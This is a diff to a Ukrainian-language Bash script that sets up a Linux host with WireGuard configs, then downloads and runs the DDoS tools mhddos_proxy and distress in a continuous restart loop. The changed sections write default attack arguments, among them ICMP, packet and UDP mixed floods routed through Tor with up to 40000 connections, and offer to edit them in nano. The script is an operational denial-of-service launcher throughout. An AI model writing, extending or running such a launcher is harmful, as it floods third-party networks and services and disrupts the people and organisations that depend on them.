@@ -2,7 +2,7 @@
 
 set -e
 
-#=== Підготовка середовища для будь-якої Linux-системи ===
+#=== Підготовка середовища для будь-якого Linux ===
 
 echo "[+] Перевірка користувача..."
 if [ "$(id -u)" -eq 0 ]; then
@@ -13,7 +13,7 @@ else
         SUDO="sudo"
         echo "[+] sudo доступний."
     else
-        echo "[-] sudo не знайдено. Потрібно встановити або увійти як root."
+        echo "[-] sudo не знайдено. Встановіть або увійдіть як root."
         exit 1
     fi
 fi
@@ -40,8 +40,6 @@ else
     exit 1
 fi
 
-echo "[+] Менеджер пакетів: $PKG_MANAGER"
-
 echo "[+] Оновлення системи і встановлення необхідних пакетів..."
 $UPDATE_CMD
 $INSTALL_CMD curl wget git screen sed
@@ -67,16 +65,11 @@ done
 
 $SUDO chmod 600 "$WG_DIR"/*.conf 2>/dev/null || true
 
-#=== Створення .ini файлів ===
-INI1="$MODULE_DIR/mhddos.ini"
-INI2="$MODULE_DIR/distress.ini"
-
-if [ ! -f "$INI1" ]; then
-  echo "--use-my-ip 0 --copies auto -t 8000" > "$INI1"
-fi
-
-if [ ! -f "$INI2" ]; then
-  echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000" > "$INI2"
+#=== Перевірка наявності WG-конфігів ===
+echo "[+] Перевірка наявності WG конфігів..."
+if ! compgen -G "$WG_DIR/*.conf" > /dev/null; then
+    echo "[-] Не знайдено жодного WG конфігу. Перевірте підключення до GitHub або репозиторій!"
+    exit 1
 fi
 
 #=== Завантаження модулів ===
@@ -102,12 +95,12 @@ fi
 case $module_choice in
     1)
         MODULE="$MODULE_DIR/mhddos_proxy"
-        CONFIG_FILE="$INI1"
+        CONFIG_FILE="$MODULE_DIR/mhddos.ini"
         MODULE_NAME="mhddos"
         ;;
     2)
         MODULE="$MODULE_DIR/distress"
-        CONFIG_FILE="$INI2"
+        CONFIG_FILE="$MODULE_DIR/distress.ini"
         MODULE_NAME="distress"
         ;;
     *)
@@ -115,6 +108,22 @@ case $module_choice in
         exit 1
         ;;
 esac
+
+#=== Підготовка конфігу INI ===
+echo "[+] Підготовка налаштувань для $MODULE_NAME..."
+echo "[?] Бажаєте редагувати параметри модуля вручну через nano? (y/n)"
+read -r edit_ini
+
+if [[ $edit_ini == "y" ]]; then
+    $SUDO nano "$CONFIG_FILE"
+else
+    echo "[+] Використовуємо базові налаштування."
+    if [[ "$MODULE_NAME" == "mhddos" ]]; then
+        echo "--use-my-ip 0 --copies auto -t 8000" > "$CONFIG_FILE"
+    elif [[ "$MODULE_NAME" == "distress" ]]; then
+        echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000" > "$CONFIG_FILE"
+    fi
+fi
 
 ARGS=$(cat "$CONFIG_FILE")
 
@@ -161,7 +170,7 @@ while true; do
         $MODULE $ARGS
     fi
 
-    echo "[+] Перезапуск за годину підготовлений."
-    echo "$(date '+%Y-%m-%d %H:%M:%S') [+] Перезапуск виконано." >> "$LOG_DIR/kaljan.log"
+    echo "[+] Логування запуску..."
+    echo "$(date '+%Y-%m-%d %H:%M:%S') [+] Модуль перезапущено успішно." >> "$LOG_DIR/kaljan.log"
 
 done
